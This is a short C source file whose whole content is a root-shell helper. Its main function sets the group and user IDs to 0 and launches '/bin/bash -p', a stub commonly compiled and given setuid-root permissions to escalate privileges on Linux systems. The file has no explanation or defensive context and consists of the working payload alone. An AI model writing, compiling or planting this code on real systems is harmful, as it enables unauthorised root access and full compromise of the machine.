// gcc program.c

int main() 
{
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
	return 0;
}

